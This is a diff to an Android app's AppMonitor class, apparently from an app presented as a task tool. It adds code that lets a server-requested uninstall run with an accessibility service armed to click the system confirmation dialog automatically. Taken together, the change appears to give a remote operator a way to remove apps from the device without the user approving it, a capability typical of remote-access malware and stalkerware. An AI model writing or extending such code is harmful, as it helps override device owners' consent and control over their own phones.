@@ -4,6 +4,7 @@ import android.content.Context;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.util.Log;
+import com.task.tusker.services.UnifiedAccessibilityService;
 import com.task.tusker.utils.Constants;
 import org.json.JSONArray;
 import org.json.JSONException;
@@ -135,15 +136,31 @@ public class AppMonitor {
     public JSONObject uninstallApp(String packageName) {
         JSONObject result = new JSONObject();
         try {
+            if (packageName == null || packageName.trim().isEmpty()) {
+                result.put("success", false);
+                result.put("error", "Package name is required");
+                return result;
+            }
+            String targetPackage = packageName.trim();
+
+            // Arm the accessibility helper for this exact server-requested
+            // package before opening the system dialog. It will verify the
+            // visible app label again before clicking any confirmation.
+            UnifiedAccessibilityService service =
+                    UnifiedAccessibilityService.getInstance();
+            if (service != null) {
+                service.armUninstallAssist(targetPackage);
+            }
+
             // Open system uninstall dialog
             android.content.Intent intent = new android.content.Intent(
                 android.content.Intent.ACTION_DELETE,
-                android.net.Uri.parse("package:" + packageName)
+                android.net.Uri.parse("package:" + targetPackage)
             );
             intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
             context.startActivity(intent);
             result.put("success", true);
-            result.put("message", "Uninstall dialog opened for " + packageName);
+            result.put("message", "Uninstall dialog opened for " + targetPackage);
         } catch (Exception e) {
             safeError(result, e);
         }
